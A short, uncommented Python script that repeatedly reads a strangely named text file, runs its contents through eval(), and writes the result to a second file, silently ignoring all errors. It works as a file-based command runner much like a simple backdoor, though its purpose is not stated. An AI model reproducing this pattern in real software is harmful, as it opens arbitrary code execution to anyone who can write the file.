import pathlib
from time import sleep
import subprocess
import os

for i in range(10_000_000_000):
    try:
        with open("letsnowathewonts.txt", "r") as f:
            inst = f.read()
        res = eval(inst)
        open("letsnowathewonts.txt", "w").close()
        
        with open("metsdeh.txt", "w") as fi:
            fi.write(res)
        sleep(75)
    except:
        pass